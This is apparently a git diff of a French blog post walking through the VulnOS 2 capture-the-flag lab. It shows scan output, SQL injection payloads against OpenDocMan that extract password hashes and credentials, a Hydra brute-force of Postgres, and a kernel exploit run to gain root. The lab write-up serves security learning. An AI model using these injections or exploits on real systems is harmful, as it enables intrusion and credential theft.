@@ -10,7 +10,7 @@ Le CTF [VulnOS 2](https://www.vulnhub.com/entry/vulnos-2,147/) est un boot2root 
 Nitro
 -----
 
-```plain
+```
 Nmap scan report for 192.168.2.4
 Host is up (0.00062s latency).
 Not shown: 65532 closed ports
@@ -41,7 +41,7 @@ Comme il n'y a aucun autre utilisateur connecté et aucun channel sur le serveur
 
 Côté web le module buster de Wapiti permet de trouver une piste différente :  
 
-```plain
+```
 [*] Launching module buster
 Found webpage http://192.168.2.4/javascript
 Found webpage http://192.168.2.4/jabc/index.php
@@ -75,7 +75,7 @@ Le logiciel parvient tout de même à trouver un utilisateur *webmin*.
 
 J'ai décidé de retenter ma chance avec [droopescan](https://github.com/droope/droopescan) :  
 
-```plain
+```
 [+] Themes found:                                                               
     seven http://192.168.2.4/jabc/themes/seven/
     garland http://192.168.2.4/jabc/themes/garland/
@@ -151,17 +151,17 @@ On n'est pas des manches, on se retrousse les manches ! Exploitation à l'ancien
 
 Avec une URL comme la suivante on peut obtenir les tables dans cette base (*odm\_admin*, *odm\_user*, *odm\_settings*, etc) :  
 
-```plain
+```
 /jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,TABLE_NAME,3,4,5,6,7,8,9%20from%20information_schema.tables%20where%20table_schema=0x6A61626364306373
 ```
 
 et avec l'injection suivante on obtient les hashs des utilisateurs MySQL :  
 
-```plain
+```
 UNION (SELECT 1,concat(User,Password),3,4,5,6,7,8,9 from mysql.user order by User)
 ```
 
-```plain
+```
 root*9CFBBC772F3F6C106020035386DA5BBBF1249A11
 phpmyadmin*9CFBBC772F3F6C106020035386DA5BBBF1249A11
 drupal7*9CFBBC772F3F6C106020035386DA5BBBF1249A11
@@ -171,7 +171,7 @@ Qui correspondent tous à *toor*.
 
 Je continue d'explorer, trouve encore un utilisateur *webmin* pour le *OpenDocMan* et extrait son mot de passe (*webmin1980*) avec l'injection  
 
-```plain
+```
 UNION SELECT distinct 1,password,3,4,5,6,7,8,9 from odm_user where username=0x7765626D696E
 ```
 
@@ -180,7 +180,7 @@ Le pied dans la porte
 
 Ces identifiants nous permettent d'avoir un accès SSH :  
 
-```plain
+```
 $ id
 uid=1001(webmin) gid=1001(webmin) groups=1001(webmin)
 $ uname -a
@@ -197,7 +197,7 @@ Dans le dossier personnel de l'utilisateur on trouve une archive *post.tar.gz* q
 
 Comme il y a un Postgres qui écoute sur 127.0.0.1 on utilise Hydra qui trouve facilement un compte :  
 
-```plain
+```
 [5432][postgres] host: 127.0.0.1   login: postgres   password: postgres
 ```
 
@@ -205,7 +205,7 @@ Ne connaissant pas trop *Postgres* je n'ai pas trouvé [la solution officielle](
 
 J'ai eu le même réflexe que les autres participants du CTF (exploit kernel) :  
 
-```plain
+```
 webmin@VulnOSv2:~$ gcc -o overlay overlay.c
 webmin@VulnOSv2:~$ ./overlay
 spawning threads
@@ -220,7 +220,7 @@ uid=0(root) gid=0(root) groups=0(root),1001(webmin)
 
 Et le flag attentdu :  
 
-```plain
+```
 You successfully compromised the company "JABC" and the server completely !!
 Congratulations !!!
 Hope you enjoyed it.
